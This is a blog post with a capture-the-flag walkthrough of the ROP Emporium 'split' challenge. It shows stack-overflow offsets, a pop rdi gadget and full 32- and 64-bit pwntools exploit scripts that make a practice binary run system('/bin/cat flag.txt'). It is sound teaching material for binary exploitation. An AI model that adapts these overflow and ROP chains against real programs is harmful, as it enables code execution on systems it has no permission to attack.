<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>ROP Emporium - split | Parro </title> <meta name="author" content="Parro "> <meta name="description" content="ROP Emporium challenge 2 - split"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%A1&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://parroquet.github.io/blog/2022/split/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">Parro </span></a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">About</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/hackthebox/">Hackthebox</a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">ROP Emporium - split</h1> <p class="post-meta">December 28, 2022</p> <p class="post-tags"> <a href="/blog/2022"> <i class="fas fa-calendar fa-sm"></i> 2022 </a>   ·   <a href="/blog/tag/formatting"> <i class="fas fa-hashtag fa-sm"></i> formatting</a>   <a href="/blog/tag/links"> <i class="fas fa-hashtag fa-sm"></i> links</a>   <a href="/blog/tag/binexp"> <i class="fas fa-hashtag fa-sm"></i> binexp</a>     ·   <a href="/blog/category/rop"> <i class="fas fa-tag fa-sm"></i> ROP</a>   <a href="/blog/category/gdb"> <i class="fas fa-tag fa-sm"></i> GDB</a>   <a href="/blog/category/pwndbg"> <i class="fas fa-tag fa-sm"></i> pwndbg</a>   <a href="/blog/category/pwntools"> <i class="fas fa-tag fa-sm"></i> pwntools</a>   </p> </header> <article class="post-content"> <h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/split.html" rel="external nofollow noopener" target="_blank">https://ropemporium.com/challenge/split.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>This challenge is a bit more complicated where instead of the command calling system and executing /bin/cat flag.txt in the same function, these are split up and ROP gadgets are needed.</p> <p> </p> <p><img src="../../../assets/img/split_img/1checksec.png" alt="checksec" width="750"></p> <p>Similar to the previous challenge, we can see that DEP/NX is enabled meaing that we cannot execute shellcode on the stack. We also see that partial RELRO is enabled which means that the the Global Offset Table (GOT) is read only. This means that we cannot overwrite any GOT entries.</p> <p> </p> <p><img src="../../../assets/img/split_img/2rabinstrings.png" alt="rabinstrings" width="750"></p> <p>Using the command provided by radare2, <strong>rabin2 -z split32</strong>, we can see the strings in the binary. /bin/cat flag.txt is seen again as well as the /bin/ls command.</p> <p> </p> <p><img src="../../../assets/img/split_img/3rabinfuncs.png" alt="rabinfuncs" width="750"></p> <p>Using -i we can see the imported functions. System is seen again which we will use to exploit this binary.</p> <p> </p> <p><img src="../../../assets/img/split_img/4ghidramain.png" alt="ghidramain" width="750"> <img src="../../../assets/img/split_img/5ghidrapwnme.png" alt="ghidrapwnme" width="750"> <img src="../../../assets/img/split_img/6ghidrausefulfunc.png" alt="ghidrausefulfunc" width="750"></p> <p>Using Ghidra we can see the main, pwnme and usefulFunction functions disassembled. This explains a lot about functionality but most importantly, it shows the binary trying to fit 0x60 worth of input into a 0x20 buffer. This means that we can overflow the buffer and overwrite the return address.</p> <p> </p> <p><img src="../../../assets/img/split_img/7pwndbgsystem.png" alt="pwndbgsystem" width="750"></p> <p>We can now start to develop our exploit. For this we will need the address of the <strong>system</strong> function. We can see this above as 0x080483e0. We can use this address or we can also use the address seen on the left for the entire line <strong>call system</strong> - 0x0804861a. By using <strong>system</strong> we will need to provide a 4 byte junk return address between system and the address of /bin/cat flag.txt to impersonate functionality of the <strong>call</strong> instruction and so the binary knows what to do after executing system. We will use the <strong>call system</strong> address for simplicity.</p> <p> </p> <p><img src="../../../assets/img/split_img/8breakmain.png" alt="breakmain" width="750"></p> <p>Next we need to grab the address of the string set which contains “/bin/cat flag.txt”. To do this within pwndbg, we need to first run the program with a breakpoint set.</p> <p> </p> <p><img src="../../../assets/img/split_img/9addrbincat.png" alt="addrbincat" width="750"></p> <p>We can then search for the string which provides us with the address.</p> <p> </p> <p><img src="../../../assets/img/split_img/10offsetsearch.png" alt="offsetsearch" width="750"> <img src="../../../assets/img/split_img/11offset.png" alt="offset" width="750"></p> <p>The last thing to do before creating our payload is to find the offset for the buffer overflow. The command <strong>cyclic 100</strong> is used again finding the EIP value and finding the offset of 44 by using <strong>cyclic -l laaa</strong>.</p> <p> </p> <p><img src="../../../assets/img/split_img/12genpayload.png" alt="genpayload" width="750"></p> <p>Finally, we can use python2 to create our payload and piping it to the binary to get the flag.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit architecture handles arguments for system calls differently to 32 bit so our exploit will look slightly different.</p> <p> </p> <p>32 bit: <img src="../../../assets/img/split_img/1332bitarguments.png" alt="1332bitarguments" width="750"></p> <p>32 bit architecture can simply just take arguments from the stack and this is why a ROP chain of 2 links was used in the 32 bit solve. Link 1 for the system call and link 2 for the address of the string.</p> <p> </p> <p>64bit: <img src="../../../assets/img/split_img/1464bitarguments.png" alt="1364bitarguments" width="750"></p> <p>However, 64 bit architecture requires the arguments to be passed in the registers seen above. This means that we need to use a ROP chain of 3 links as we need to pass an instruction which populates the RDI register before calling system. A commonly used gadget <strong>pop rdi; ret</strong> can be used to populate the RDI register as it will pop the value off the stack and store it in the RDI register.</p> <p> </p> <p><img src="../../../assets/img/split_img/15cyclic.png" alt="cyclic" width="750"></p> <p>Firstly, we find the offset of the buffer overflow using the cyclic command as seen before.</p> <p> </p> <p><img src="../../../assets/img/split_img/16offset.png" alt="offset" width="750"></p> <p>By taking the first 8 bytes of the RSP register, we can see that the offset is 40.</p> <p> </p> <p><img src="../../../assets/img/split_img/17systemaddr.png" alt="systemaddr" width="750"></p> <p>Again we take the address for system on the left and write it down for later use.</p> <p> </p> <p><img src="../../../assets/img/split_img/18bincataddr.png" alt="bincataddr" width="750"></p> <p>We need then to find the 64 bit address of the “/bin/cat flag.txt” string which we can do by searching within pwndbg using the same command as before.</p> <p> </p> <p><img src="../../../assets/img/split_img/19ropgadget.png" alt="ropgadget" width="750"></p> <p>Lastly, we need to find our rop gadget which can populate the RDI register with the “/bin/cat flag.txt” string for our system call. We can use the command <strong>ROPgadget –binary split64 –ropchain</strong> to list all the gadgets available and by using a simple grep, we find our <strong>pop rdi ; ret</strong> gadget address which we can note down.</p> <p>ROPgadget was installed using <strong>sudo apt install python3-ropgadget</strong>.</p> <p> </p> <p><img src="../../../assets/img/split_img/20order.png" alt="order" width="750"></p> <p>Before we build the payload, we need to understand the order of the ROP chain. The order is as follows:</p> <ul> <li>The first 40 bytes of the payload is the offset of the buffer overflow.</li> <li>The next few bytes is the address of the <strong>pop rdi ; ret</strong> gadget.</li> <li>The next few bytes are the address of the “/bin/cat flag.txt” string.</li> <li>Lastly is the address of the <strong>system</strong> function.</li> </ul> <p>This is the order as the <strong>pop rdi ; ret</strong> gadget first needs to pop the address of the “/bin/cat flag.txt” string off the stack and store it in the RDI register. The string value comes next as this is what is popped. Lastly, the <strong>system</strong> function is appended as it will be called using the RDI register as the argument.</p> <p> </p> <p><img src="../../../assets/img/split_img/21payloadcreated.png" alt="payloadcreated" width="750"></p> <p>A final payload can then be created using python2 in little endian and by padding with null bytes to fit the 64 bit architecture. Piping this to the binary will give us the flag.</p> <p> </p> <h3 id="scripts">Scripts</h3> <p>Provided are the two scripts used to solve this challenge. These are inspired by CryptoCat’s youtube tutorial and edited for my own understanding. Furthermore, these scripts will be used as a template for the remaining ROPEmporium challenges.</p> <p> </p> <h4 id="32-bit">32 bit</h4> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./split32'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bincat_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/cat'</span><span class="p">))</span>
<span class="n">junk_addr</span> <span class="o">=</span> <span class="mh">0x61616161</span>       <span class="c1"># junk address needed to impersonate as call system
</span>
<span class="c1"># can do it this way also - using "call system" instead of "system"
#bincat_addr = 0x0804a030     &lt;- bincat same as above
#callsystem_addr = 0x0804861a &lt;- call system addr different to above
</span>

<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x system"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x /bin/cat"</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">)</span>


<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="c1"># Print out the address of EIP at the time of crashing
</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
<span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="c1"># Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
# fit works below by making it aaa + addr1 + addr2 + addr3 and converts hex to ascii where appropriate
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">eip_offset</span><span class="p">:</span> <span class="p">[</span><span class="n">system_addr</span><span class="p">,</span> <span class="n">junk_addr</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">]})</span>

<span class="c1"># alternative way - p32 converts 0x90 to \x90
# payload = b""
# payload += b'A' * eip_offset
# payload += p32(system_addr)
# payload += p32(junk_addr)
# payload += p32(bincat_addr)
# print(payload)
</span>

<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> <h4 id="64-bit">64 bit</h4> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./split'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004007c3</span>
<span class="n">bincat_addr</span> <span class="o">=</span> <span class="mh">0x0000000000601060</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x000000000040074b</span>

<span class="c1"># can do it this way also - using "call system" instead of "system"
#bincat_addr = 0x0000000000601060     &lt;- bincat same as above
#callsystem_addr = 0x000000000040074b &lt;- call system addr different to above
#ropgadget = 0x00000000004007c3 &lt;- needed for 64 bit architecture as arguments for system 
# are called from rdi so we need to pop from the stack and store into rdi so "pop rdi ; ret" gadget is used
</span>

<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi; ret;"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x /bin/cat"</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x system"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>


<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>

<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="c1"># read first 4 
</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="c1"># Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
# Note that we have to call pop_rdi gadget here
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bincat_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> </article> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2023 Parro . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="/assets/js/common.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>